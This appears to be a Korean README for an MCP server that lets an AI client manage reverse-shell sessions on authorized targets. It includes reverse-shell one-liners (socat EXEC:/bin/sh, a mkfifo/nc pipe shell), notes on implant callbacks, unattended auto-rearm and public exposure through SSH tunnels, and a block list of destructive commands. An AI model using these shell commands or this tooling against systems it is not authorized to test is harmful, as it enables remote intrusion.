# revshell-mcp

리버스 셸 세션을 MCP 툴로 노출하는 핸들러 서버. `nc -lvnp`를 대체하되 다중 세션 관리, 명령 완료 감지(종료코드 포함), 커서 기반 증분 읽기, 입력 검증을 갖췄습니다.

```
listener_start(31338)  →  타겟이 콜백  →  session_exec("uname -a")
                                          → {"output": "Linux ...", "exit_code": 0}
```

## 사용 범위

**인가된 보안 테스트 · CTF · 자신이 소유한 시스템에서만 사용하세요.**

이 프로젝트는 오퍼레이터 콘솔입니다. Metasploit의 `multi/handler`, `pwncat`과 같은 계층에 속하며 **타겟에 접근하는 수단은 포함하지 않습니다.** 하는 일은 이미 맺어진 연결의 I/O 중계와 세션 관리뿐입니다.

다음은 범위 밖이며 구현하지 않습니다.

- 페이로드 생성, 인코딩, 난독화
- AV/EDR 우회, 안티디버깅, 인메모리 로딩
- 익스플로잇, 취약점 스캐닝, 자동 권한상승
- 지속성 설치, 횡적 이동 자동화
- C2 채널 은닉(도메인 프론팅, DNS 터널링, 트래픽 위장)

## 요구사항

- Python 3.11+
- `mcp` 2.0+ (설치 시 자동)
- POSIX 셸 타겟(sh/bash). Windows 타겟은 지원하지 않습니다.

## 설치

```bash
git clone https://github.com/rev-ing/revshell-mcp.git
cd revshell-mcp
./setup.sh
```

요구사항 확인 → 가상환경 생성 → 설치 → 검증까지 하고, 마지막에 **경로가 채워진 등록 명령어**를 출력합니다.

```
./setup.sh            기본
./setup.sh --register  설치 후 Claude Code 에 자동 등록 (claude CLI 필요)
./setup.sh --test      설치 후 전체 테스트까지 실행
./setup.sh --force     기존 .venv 를 지우고 새로 만든다
```

`--register`를 주면 아래 등록 단계까지 한 번에 끝납니다. 이미 등록되어 있으면 경로를 갱신합니다.

```bash
git clone https://github.com/rev-ing/revshell-mcp.git && cd revshell-mcp
./setup.sh --register     # 설치 + 등록
# Claude Code 재시작
```

Python 3.11 미만이거나 `venv`가 없으면 배포판별 설치 명령을 안내하고 중단합니다. 재실행해도 안전합니다.

<details>
<summary>수동 설치</summary>

```bash
python3 -m venv .venv
.venv/bin/pip install -e .
```
</details>

## MCP 클라이언트 등록

**Claude Code**

```bash
claude mcp add revshell -s user -- /path/to/reverse_shell_mcp/.venv/bin/revshell-mcp
```

`./setup.sh`가 실제 경로가 들어간 명령을 그대로 출력해 주므로 복사해 쓰시면 됩니다. 등록 후 재시작하고 `/mcp`로 연결을 확인하세요.

**그 외 클라이언트**

```json
{
  "mcpServers": {
    "revshell": {
      "command": "/path/to/reverse_shell_mcp/.venv/bin/revshell-mcp"
    }
  }
}
```

**CLI 옵션**

```
revshell-mcp [--allow-any-interface] [--max-sessions 32]
             [--buffer-bytes 1048576] [--heartbeat-sec 60]
             [--log-level INFO]
```

| 옵션 | 기본값 | 설명 |
|---|---|---|
| `--allow-any-interface` | 꺼짐 | 루프백 외 바인드 허용 ([보안](#보안) 참조) |
| `--max-sessions` | 32 | 동시 세션 상한 |
| `--buffer-bytes` | 1 MiB | 세션당 링버퍼 크기 |
| `--heartbeat-sec` | 60 | 유휴 세션 liveness 프로브 주기. `0`이면 끔 ([half-open](#세션은-조용히-죽습니다) 참조) |

## 빠른 시작

**① 리스너를 엽니다**

```
listener_start(port=31338)
→ {"listener_id": "lsn_d69b", "host": "127.0.0.1", "port": 31338}
```

**② 타겟을 붙입니다**

```bash
# PTY 없음 — 평소엔 이걸로 충분
socat TCP:127.0.0.1:31338 EXEC:/bin/sh,stderr

# PTY 있음 — sudo 나 실행 중단이 필요할 때
socat TCP:127.0.0.1:31338 EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane

# nc 만 있을 때
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | sh -i 2>&1 | nc 127.0.0.1 31338 > /tmp/f
```

`,stderr`를 빼면 에러 메시지가 넘어오지 않습니다([아래](#pty를-붙일지-말지) 참조).

**③ 세션을 확인하고 명령을 실행합니다**

```
session_list()
→ {"listener": null,                        // 1개 받고 자동으로 닫힘
   "sessions": [{"id": "sess_f97f", "peer": "127.0.0.1:40498",
                 "state": "active", "has_pty": true, ...}]}

session_exec(session_id="sess_f97f", cmd="id")
→ {"output": "uid=1000(irev) gid=1000(irev) groups=...",
   "exit_code": 0, "next_since": 393, "complete": true,
   "truncated": false, "capped": false, "hint": null}
```

## 툴

| 툴 | 상한 | 역할 |
|---|---|---|
| `listener_start(port, host="127.0.0.1", accept=1, rearm=false)` | 즉시 | 리스너 시작. 기본 1세션만 받고 자동 중단 |
| `listener_stop()` | 즉시 | 포트 반납. 기존 세션은 유지. 재무장 취소 |
| `session_list()` | 즉시 | 리스너 상태 + 세션 요약 |
| `session_read(session_id, since=0, wait_ms=0, max_bytes=65536)` | `wait_ms` | 원시 스트림 증분 조회 |
| `session_write(session_id, data, newline=true, confirm=false)` | 즉시 | 원시 전송. 완료 감지 없음 |
| `session_close(session_id)` | 즉시 | 연결 끊기. 버퍼는 유지 |
| `session_exec(session_id, cmd, timeout=15, max_bytes=65536, confirm=false)` | `timeout` | 전송 + 완료 감지 + 출력 |

<details>
<summary>파라미터 · 반환값 상세</summary>

### `listener_start(port, host, accept)`

접속 확인은 `session_list` 폴링으로 합니다. 포트를 옮기려면 `listener_stop()`을 먼저 호출하세요.

`accept`만큼 세션을 받으면 **리스너가 스스로 닫힙니다**(기본 1). `accept=0`이면 무제한입니다.

같은 포트·host로 재호출하면 **쿼터가 누적**됩니다 — 멱등이 아닙니다. 3번 부르면 3개를 받습니다. host나 port가 다르면 거부되고 쿼터도 오르지 않습니다.

```
listener_start(31338)              → accept_remaining: 1
listener_start(31338, accept=2)    → accept_remaining: 3   (누적)
listener_start(31338, "0.0.0.0")   → error (bind address 변경은 listener_stop 먼저)
```

`rearm=true`면 세션을 잃을 때마다(끊김·`stale`·`session_close`) **리스너가 자동으로 다시 열립니다.** 재시도 루프를 도는 타겟이 알아서 재접속하므로 무인 운용이 됩니다. 자세한 건 아래 [자동 재무장](#링크가-불안정하면-자동-재무장을-켜세요)을 보세요.

### `listener_stop()`

리스닝 소켓만 닫고 포트를 반납합니다. 이미 붙어 있는 세션은 건드리지 않습니다.

**자동 재무장도 함께 취소합니다.** 재무장을 끄는 방법은 이것뿐입니다.

### `session_list()`

반환은 `{"listener": {...} | null, "rearm": {...} | null, "sessions": [...]}` 형태입니다. `listener`가 `null`이면 리스너가 없는 것 — 시작한 적이 없거나, 중단했거나, **수락 쿼터를 채워 스스로 닫힌** 상태입니다. `accept_remaining`은 앞으로 몇 개를 더 받을지이며 `null`은 무제한입니다.

`rearm`이 `listener` 밖에 있는 이유는, 재무장을 기다리는 동안에는 `listener`가 `null`이기 때문입니다 — 안에 넣으면 정작 알아야 할 때 사라집니다.

세션 한 줄의 주요 필드:

| 필드 | 뜻 |
|---|---|
| `state` | `active` / `stale` / `dead` — 아래 [half-open](#세션은-조용히-죽습니다) 참고 |
| `age_sec` | 접속 후 경과. **liveness와 무관합니다** |
| `last_rx_sec` | 마지막 수신 후 경과. **판단은 이 값으로 하세요** |
| `busy` | `session_exec` 실행 중 |
| `has_pty` | 아래 [PTY 판별](#pty-판별) 참고 |
| `write_stalled` | drain 타임아웃 — 보냈지만 도달은 미확인 |

세션 각 행의 필드:

| 필드 | 의미 |
|---|---|
| `state` | `active` \| `dead` |
| `end_cursor` | 버퍼의 절대 끝. "얼마나 밀렸나" 판단용 |
| `buffered_bytes` | 버퍼에 남아 있는 양 |
| `busy` | `session_exec` 진행 중 |
| `write_stalled` | 직전 전송의 drain 타임아웃 |
| `has_pty` | `true`/`false`/`null`(판별 실패). [PTY 판별](#pty-판별) 참조 |

### `session_read(session_id, since, wait_ms, max_bytes)`

| 필드 | 의미 |
|---|---|
| `data` | 출력. UTF-8, 깨진 바이트는 `errors="replace"` |
| `next_since` | 다음 호출의 `since`에 넣을 값 |
| `truncated` | 폴링이 늦어 버퍼 앞부분 유실 |
| `capped` | `max_bytes`에 걸림. 더 남아 있음 |

`since` 이후 데이터가 있으면 즉시, 없으면 `wait_ms`까지 대기합니다. 타임아웃되면 빈 `data`와 입력과 같은 `next_since`를 반환합니다.

### `session_write(session_id, data, newline, confirm)`

`session_exec`이 막힐 때만 씁니다. 대화형 프로그램 제어, 여러 줄 입력, 제어 바이트 전송. 출력은 `session_read`로 회수합니다.

제어 바이트(`\x04`, `\x03`)는 **PTY가 있는 세션에서만** 효과가 있습니다. 일반 텍스트는 어느 세션에서든 동작합니다.

`bytes_written`은 "전송됨"이 아니라 "큐에 넣음"입니다.

### `session_close(session_id)`

연결을 끊습니다. 기록은 지우지 않으므로 `session_read`로 마지막 출력을 회수할 수 있습니다. 멱등이며 `already_dead`로 구분됩니다.

### `session_exec(session_id, cmd, timeout, max_bytes, confirm)`

| 필드 | 의미 |
|---|---|
| `output` | 프레임 안쪽만. 에코·프롬프트·마커 제거됨 |
| `exit_code` | 종료코드. 미완료거나 백그라운드면 `null` |
| `next_since` | 이어읽기용 커서. 거부되면 `null` |
| `complete` | `false`는 대개 미완료. 단 `hint`를 먼저 읽으세요 |
| `truncated` | 링버퍼 유실로 출력 중간이 사라짐 |
| `capped` | `max_bytes` 초과로 가운데를 잘라냄. 앞뒤는 보존 |
| `hint` | 후속 안내. 주로 `complete: false`일 때이고, 백그라운드 성공에도 붙습니다 |

</details>

## 주의사항

### 커서는 `next_since`로만 이어붙입니다

```
session_exec  → next_since: 664
session_read(since=664) → next_since: 697
session_read(since=697) → ...
```

- `next_since`가 `null`이면 **커서를 갱신하지 말고 이전 값을 유지**하세요. 아무것도 읽지 않았다는 뜻입니다.
- `session_list`의 `end_cursor`는 `since`에 넣는 값이 **아닙니다.** 넣으면 그 사이 데이터가 통째로 사라집니다.

### `complete` / `truncated` / `capped`는 각각 다른 얘기

| | 뜻 | 대응 |
|---|---|---|
| `complete: false` | 아직 안 끝남 | `session_read(since=next_since)`로 이어보기 |
| `truncated: true` | 폴링이 늦어 출력 중간 유실 | 신뢰하지 말고 재실행 |
| `capped: true` | 상한에 걸려 가운데 잘림 | 앞뒤는 유효 |

셋은 독립입니다. `complete: true`인데 `capped: true`일 수 있습니다.

### `session_read`와 `session_exec`은 보는 게 다릅니다

`session_read`는 **원시 스트림**이라 PTY 에코, 셸 프롬프트, 내부 프레이밍 마커가 전부 보입니다. 정상입니다. `session_exec`은 그중 프레임 안쪽만 오려냅니다.

```
session_read:  $ printf '__S''90fe...''__\n'; id; printf ...   ← 에코
               __S90fe1f16cd0d__
               uid=1000(irev) gid=1000(irev) ...
               __E90fe1f16cd0d__0
               $

session_exec:  output: "uid=1000(irev) gid=1000(irev) ..."   exit_code: 0
```

`since=0`으로 읽으면 버퍼 전체가 나옵니다. 증분 조회에는 `next_since`를 쓰세요.

### `cmd` 제약

셸 구문을 깨거나 종료 마커를 삼키는 입력은 실행 전에 거부됩니다. 그대로 두면 원인 불명의 타임아웃으로만 보이기 때문입니다.

| 거부 | 이유 |
|---|---|
| 빈 문자열 | 구문 에러 |
| 개행 포함 | `$?`가 마지막 줄의 것이 됨 |
| `; \| && \|\| > < >>`로 끝남 | 구문 에러 또는 뒷부분 흡수 |
| `\`로 끝남 | 종료 마커가 인자로 흡수됨 |
| 따옴표 밖 `#` 주석 | 종료 마커까지 주석 처리 → 타임아웃 |
| 따옴표 불균형 | 셸이 continuation 상태로 남아 세션 오염 |

**끝의 `&` 하나는 거부되지 않습니다** — [백그라운드 실행](#백그라운드-실행)으로 처리됩니다.

아래는 통과합니다.

```sh
find . -name '*.log' -exec rm {} \;    # 이스케이프된 ; 는 연산자가 아님
echo "it's fine"                       # " 안의 홀수 개 ' 는 정상
echo a#b                               # 단어 중간의 # 는 주석이 아님
rm -rf /tmp/build                      # 루트가 아니므로 통과
nohup ./agent >/tmp/log 2>&1 &         # 백그라운드 — exit_code 는 null
```

여러 줄이 필요하면 `session_write`를 쓰세요.

### 세션은 조용히 죽습니다

`state: "active"`만 보고 세션이 살아 있다고 믿으면 안 됩니다. **TCP가 half-open이 되면 로컬 소켓은 `ESTABLISHED`로 남습니다** — 특히 SSH 역터널이나 NAT를 거치는 경로에서, 중간 홉이 사라져도 커널은 아무것도 눈치채지 못합니다. 실제로 21시간째 `active`로 떠 있던 세션이 이미 죽어 있던 사례가 있습니다.

이 경우 예전에는 이렇게 보였습니다:

```
session_exec  → complete: false, output 없음
                hint: "may still be running... continue with session_read"
session_read(wait_ms=8000) → 빈 응답
```

힌트를 믿고 계속 기다리게 되는 게 진짜 문제였습니다. 지금은 세 가지로 대응합니다.

**1. `last_rx_sec`을 보세요.** `age_sec`은 접속 후 흐른 시간이라 죽은 세션도 계속 나이를 먹습니다. 둘이 비슷하게 커져 있으면 링크가 죽은 겁니다.

```
age_sec: 81084, last_rx_sec: 0.4     → 살아 있음
age_sec: 81084, last_rx_sec: 80012   → 죽었음
```

**2. `state: "stale"`** — 유휴 세션에 주기적으로 no-op을 보내 응답을 확인합니다(기본 60초, `--heartbeat-sec 0`으로 끔). 무응답이면 `stale`이 됩니다.

`stale`은 **추정이지 확정이 아닙니다.** 링크가 half-open이거나, 셸이 `session_write`로 받은 긴 명령에 물려 있거나 둘 중 하나이며 서버는 구분할 수 없습니다. 그래서 아무것도 파괴하지 않고, **한 바이트만 수신해도 즉시 `active`로 돌아옵니다.** 계속 `stale`이면 `session_close` 하세요.

> 커널 TCP keepalive로는 못 잡습니다. keepalive는 **이 소켓의 상대편**만 검사하는데, `ssh -R` 뒤에서 그 상대편은 로컬 sshd입니다. 앱 레벨 왕복만이 링크 전체를 검사합니다.

**3. 힌트가 달라집니다.** `stale` 세션에서 명령이 타임아웃하면 "아직 실행 중일 수 있다"가 아니라 half-open 가능성과 `session_close`를 안내합니다.

부작용: 하트비트도 프레임을 쓰므로 `session_read`에 `__S…__` / `__E…__0` 두 줄이 주기적으로 보입니다. `session_exec` 출력에서는 제거됩니다. 또 프로브가 도는 짧은 순간에 `session_exec`을 부르면 `busy`가 올 수 있습니다 — 그대로 재시도하면 됩니다.

### 링크가 불안정하면 자동 재무장을 켜세요

`accept` 쿼터가 막는 건 **붙어 있는 동안의 폭주**이지 **끊긴 뒤의 복구**가 아닙니다. 세션이 끊기면 리스너는 이미 닫혀 있으므로 매번 손으로 다시 열어야 했습니다.

```
listener_start(31338, rearm=true)
```

세션을 잃을 때마다(끊김·`stale`·`session_close`) 리스너가 자동으로 다시 열립니다. 타겟이 30초 주기로 재시도한다면 그대로 재접속됩니다.

- 세션 하나당 **한 번만** 재무장합니다. `stale`↔`active`를 오가도 폭주하지 않습니다.
- `--max-sessions` 여유가 없으면 보류합니다.
- **끄는 방법은 `listener_stop()`뿐입니다.**
- 대기 중인지는 `session_list()`의 `rearm`으로 확인합니다.

### 백그라운드 실행

`cmd &`를 그대로 쓸 수 있습니다.

```
session_exec("nohup /tmp/agent >/tmp/agent.log 2>&1 &")
  → complete: true, exit_code: null
```

`exit_code`가 `null`인 이유는 셸이 **기동 사실만** 알려주고 결과는 알려주지 않기 때문입니다(POSIX에서 비동기 리스트의 종료 상태는 항상 0입니다). 그 0을 성공으로 오독하지 않도록 지웁니다.

- **출력은 리다이렉트하세요.** 잡의 stdout은 계속 이 세션으로 흘러들어 이후 명령 출력과 섞입니다.
- PID는 `session_exec("echo $!")`로 회수합니다.
- `&&`는 여전히 거부됩니다 — 그건 미완성 명령이지 백그라운드가 아닙니다.

### 타겟이 busybox면 감안하세요

임베디드 타겟은 대개 busybox입니다. `awk`에 `strtonum`이 없고, `df`·`ps` 출력 형식이 GNU 계열과 다르고, `timeout`·`pidof` 옵션이 축소돼 있습니다. 이 서버는 셸 종류를 판별하지 않으므로 **명령이 실패하면 먼저 그쪽을 의심하세요.**

`has_pty: false`인 세션에서는 특히 조심해야 합니다. 막히는 명령을 중단할 수단이 없어서 `session_close`가 유일한 탈출구입니다:

- 인자 없는 `cat`, `python`, `sh` 같이 stdin을 먹는 명령을 피하세요
- 페이저·에디터(`less`, `vi`)를 피하세요
- 끝이 없을 수 있는 명령엔 `| head -n 50`을 붙이세요

### 리스너는 기본적으로 1개만 받고 닫힙니다

임플란트는 대개 재시도 루프를 돕니다. 무제한 리스너를 30초 주기 루프 앞에 두면 **30초마다 세션이 하나씩 쌓여** `--max-sessions`를 포화시킵니다. 그래서 `accept` 기본값이 1입니다.

```
listener_start(31338)            # 1개 받고 닫힘
listener_start(31338, accept=3)  # 3개 받고 닫힘
listener_start(31338, accept=0)  # 무제한 — listener_stop 으로 직접 닫아야 함
```

닫혔는지는 `session_list()`의 `listener` 필드로 확인합니다(`null`이면 닫힘).

주의: 리스너를 열어둔 채 사람이 메시지를 주고받는 동안에도 세션은 계속 붙습니다. 재시도 주기가 짧은 타겟이면 **대화 왕복 한 번에 한두 개가 더 생깁니다.**

### 포트 1개 = 세션 1개가 아닙니다

리스너 하나로 여러 타겟을 받습니다. 타겟마다 포트를 나눌 필요가 없습니다. 다만 **`accept` 쿼터가 먼저 걸리므로**, 타겟 4대를 받으려면 `accept=4`(또는 `accept=0`)를 주어야 합니다.

### 세션이 엉켰을 때 — PTY 유무에 따라 다릅니다

따옴표 불균형이나 stdin을 소비하는 명령(`cat`, 인자 없는 `python`)으로 셸이 멈췄을 때:

| 복구 수단 | PTY 없음 | PTY 있음 |
|---|---|---|
| 닫는 따옴표 + 개행 (`session_write`) | ✅ | ✅ |
| Ctrl-C (`\x03`), EOF (`\x04`) | ❌ 효과 없음 | ✅ |
| `session_close` | ✅ | ✅ |

`\x03`·`\x04`를 시그널과 EOF로 바꿔주는 것은 **tty 라인 디시플린**입니다. PTY 없는 파이프 세션에서는 그냥 바이트 한 개로 전달되어 아무 효과가 없습니다. 이 경우 `session_close`가 유일한 탈출구입니다.

### PTY 판별

연결 직후 `test -t 0`을 한 번 실행해 PTY 여부를 판별하고 `session_list`의 `has_pty`로 노출합니다. 종료코드만 보므로(tty면 0) 출력 파싱이 없고, `test`는 셸 내장이라 busybox 최소 rootfs에서도 동작합니다.

| 값 | 의미 |
|---|---|
| `true` | 제어 바이트가 먹힘. 막혀도 복구 가능 |
| `false` | 제어 바이트 무효. 엉키면 `session_close` 뿐 |
| `null` | **판별 실패 또는 진행 중.** `false`로 해석하면 안 됩니다 |

두 가지 부작용이 있습니다.

- 판별 명령이 세션 버퍼에 남습니다. `session_read(since=0)`을 하면 프레임이 하나 보입니다.
- 판별 중에는 `exec_lock`을 잡으므로, 접속 직후 곧바로 `session_exec`을 부르면 `busy`가 돌아올 수 있습니다. 그대로 재시도하면 됩니다.

### PTY를 붙일지 말지

| | PTY 없음 (파이프) | PTY 있음 |
|---|---|---|
| `session_read`의 원시 스트림 | 깔끔 | 에코·프롬프트·`\r\n` 섞임 |
| `session_exec`의 `output` | 깔끔 | **똑같이 깔끔** |
| 막혔을 때 복구 | `session_close` 뿐 | `\x03`·`\x04` 가능 |
| `sudo`, `su`, `passwd` | ❌ TTY 없어 거부 | ✅ |
| `vim`, `top`, `less` | ❌ | ✅ |

`session_exec` 결과물은 양쪽이 동일합니다. 차이는 **막혔을 때 빠져나올 수 있느냐**와 **TTY를 요구하는 프로그램을 쓸 수 있느냐**입니다.

```bash
# PTY 없음 — 평소엔 충분
socat TCP:host:31338 EXEC:/bin/sh,stderr

# PTY 있음 — sudo 나 중단이 필요할 때
socat TCP:host:31338 EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane
```

`,stderr`를 빼면 **에러 메시지가 세션으로 넘어오지 않습니다.** `exit_code`만 보이고 실패 이유는 보이지 않으므로 붙이는 것을 권합니다.

## 보안

**바인드 게이트** — 기본 바인드는 `127.0.0.1`입니다. 루프백 외 주소는 CLI 플래그와 `host` 인자가 **둘 다** 명시된 경우에만 허용됩니다.

```bash
revshell-mcp --allow-any-interface       # ① 서버 기동
listener_start(31338, host="0.0.0.0")    # ② 툴 호출
```

플래그는 허용만 할 뿐 기본값을 바꾸지 않습니다. 인증 없는 셸 핸들러를 전 인터페이스에 여는 것은 아무나 붙을 수 있다는 뜻입니다.

**파괴적 명령 게이트** — `rm -rf /`, `mkfs.`, `dd of=/dev/`, `shutdown|reboot`, 포크폭탄은 `confirm=true` 없이 거부됩니다. 루트 삭제만 좁게 잡으므로 `rm -rf /tmp/build`는 통과합니다. 오타·폭주 방지용이며 **악의적 우회를 막지는 못합니다.**

**프롬프트 인젝션** — 이 도구는 원격 호스트의 출력을 LLM 컨텍스트로 직접 밀어 넣습니다. 원격 호스트는 정의상 신뢰할 수 없고, 파일 내용·프로세스 목록·배너에 LLM을 겨냥한 지시문이 심겨 있을 수 있습니다. 세션 출력을 `data`/`output` 필드에 격리하고 모든 툴 description에 경고를 명시하지만, **`nc`에는 없던 위험**이므로 신뢰할 수 없는 타겟을 붙일 때 염두에 두세요.

## 원격 배포

MCP 서버는 클라이언트의 자식 프로세스로 실행되므로, 타겟이 인터넷 너머에서 콜백한다면 리스너가 도는 위치를 먼저 정해야 합니다.

**SSH 역터널 (권장)** — 리스너는 루프백에 두고 공인 서버가 트래픽을 넘겨줍니다. 단계별 설정과 문제 해결은 **[TUNNEL.md](TUNNEL.md)** 를 보세요.

```bash
ssh -R 0.0.0.0:31338:localhost:31338 user@public-server -N
```

서버의 `sshd_config`에 `GatewayPorts yes`가 필요합니다. 바인드 게이트를 켤 필요가 없고, 노출되는 건 SSH가 인증하는 포트뿐입니다.

**공인 서버에서 직접 실행** — MCP 클라이언트를 공인 서버에서 띄우고 `--allow-any-interface`로 기동합니다. 단순하지만 인증 없는 핸들러가 그대로 노출됩니다.

> **WSL2 주의**: WSL은 기본적으로 NAT 뒤에 있어, WSL 안에서 `0.0.0.0`에 바인드해도 LAN에서 보이지 않습니다. `.wslconfig`에 `networkingMode=mirrored`를 넣거나 `netsh interface portproxy`로 포워딩해야 합니다.

## 테스트

```bash
python -m unittest discover -s tests -t . -p 'test_*.py'
```

실제 타겟 없이 전 기능을 검증합니다. 테스트 86개, 약 16초, 외부 네트워크 접근 없음.

`tests/mock_target.py`가 파이프 모드(`sh` + `subprocess.PIPE`)와 PTY 모드(`pty.openpty()`로 에코·프롬프트 재현)를 제공하며, 통합 테스트는 두 모드에서 모두 실행됩니다.
